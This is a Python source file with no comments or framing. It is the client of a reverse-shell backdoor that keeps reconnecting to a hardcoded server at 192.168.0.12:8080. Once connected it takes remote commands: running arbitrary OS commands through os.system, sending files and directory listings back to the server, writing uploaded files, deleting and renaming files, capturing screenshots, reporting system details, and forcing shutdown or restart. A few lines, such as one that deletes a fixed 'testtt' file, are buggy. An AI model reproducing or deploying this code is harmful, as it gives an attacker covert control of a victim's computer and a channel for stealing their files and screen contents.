import subprocess
import pyautogui
import platform
import socket
import shutil
import time
import os

run = True
while run:
    try:
        s = socket.socket()
        port = 8080
        host = "192.168.0.12"
        s.connect((host, port))
        print()
        print("Connected to the server successfully")
        print()
        run = False
    except:
        print("Couldn't connect, trying again...")
        time.sleep(2)

while True:
    command = s.recv(5000)
    command = command.decode()

    if command == "cmd":
        cmd = True
        path = os.getcwd()
        path = str(path)
        s.send(path.encode())
        while cmd:
            cmd_command = s.recv(10000)
            cmd_command = cmd_command.decode()

            if cmd_command == "exit":
                cmd = False

            elif cmd_command == "cwd":
                files = os.getcwd()
                files = str(files)
                s.send(files.encode())

            elif cmd_command[:8] == "view_dir":
                cmd_command_path = cmd_command.strip("view_dir ")

                try:
                    files = os.listdir(cmd_command_path)
                    files = str(files)
                    s.send(files.encode())
                except:
                    error = "Invalid directory"
                    s.send(error.encode())

            elif cmd_command[:7] == "rm_file":
                cmd_command_path = cmd_command.strip("rm_file ")
                print(cmd_command_path)

                try:
                    os.remove("testtt")
                    files = "File removed"
                    s.send(files.encode())
                except:
                    error = "Invalid directory"
                    s.send(error.encode())

            elif cmd_command[:13] == "download_file":
                cmd_command_path = cmd_command.strip("download_file ")

                try:
                    files = open(cmd_command_path, "rb")
                    data = files.read()
                    s.send(data)
                except:
                    error = "Invalid directory"
                    s.send(error.encode())

            elif cmd_command[:5] == "mkdir":
                cmd_command_path = cmd_command.strip("mkdir ")
                try:
                    os.mkdir(cmd_command_path)
                    returned = "Created new directory"
                    s.send(returned.encode())
                except:
                    error = "Invalid path"
                    s.send(error.encode())

            elif cmd_command == "send_file":
                file_name = s.recv(6000)
                new_file = open(file_name, "wb")
                data = s.recv(10000)
                new_file.write(data)
                new_file.close()

            elif cmd_command[:5] == "chdir":
                cmd_command_path = cmd_command.strip("chdir ")
                try:
                    os.chdir(cmd_command_path)
                    new_dir = os.getcwd()
                    s.send(new_dir.encode())
                except:
                    error = "Invalid directory"
                    s.send(error.encode())

            elif cmd_command == "rename":
                name = s.recv(5000)
                name = name.decode()
                new_name = s.recv(5000)
                new_name = new_name.decode()
                try:
                    os.rename(name, new_name)
                    returned = "File name changed"
                    s.send(returned.encode())
                except:
                    error = "Invalid file"
                    s.send(error.encode())

            elif cmd_command == "command":
                os_commnad = s.recv(5000)
                os_commnad = os_commnad.decode()
                os.system(os_commnad)
                returned = "Command executed"
                s.send(returned.encode())

            elif cmd_command == "view_cdir":
                cwd = os.getcwd()
                cwd = str(cwd)
                view_dir = os.listdir(cwd)
                view_dir = str(view_dir)
                s.send(view_dir.encode())

            elif cmd_command == "cp_file":
                file = s.recv(5000)
                file = file.decode()
                new_file = s.recv(5000)
                new_file = new_file.decode()
                first = file
                second = new_file
                try:
                    shutil.copy2(first, second)
                    returned = "File copied"
                    s.send(returned.encode())
                except:
                    error = "Invalid directory"
                    s.send(error.encode())

            elif cmd_command == "view_txt":
                file_path = s.recv(5000)
                file_path = file_path.decode()
                print(file_path)

                try:
                    files = open("r" + file_path, "rb")
                    data = files.read()
                    s.send(data)
                except:
                    error = "Invalid directory"
                    s.send(error.encode())
            else:
                print("Invalid command")

    elif command == "sysinfo":
        my_system = platform.uname()
        sys_list = [f"System: {my_system.system}", f"Node Name: {my_system.node}", f"Release: {my_system.release}",
                    f"Version: {my_system.version}", f"Machine: {my_system.version}",
                    f"Processor: {my_system.processor}"]

        file = open("info.txt", "w")
        file.close()

        file = open("info.txt", "a")
        for item in sys_list:
            file.write(item + "\n")
        file.close()

        file = open("info.txt", "rb")
        data = file.read()
        s.send(data)
        file.close()

        os.remove("info.txt")

    elif command == "screenshot":
        ss = pyautogui.screenshot('screenshot.png')
        img = open("screenshot.png", "rb")
        img = img.read()
        s.send(img)
        os.remove("screenshot.png")

    elif command == "shutdown":
        os.system("shutdown /s /t 1")

    elif command == "restart":
        os.system("shutdown -t 0 -r -f")

    elif command == "close":
        s.close()
        exit()
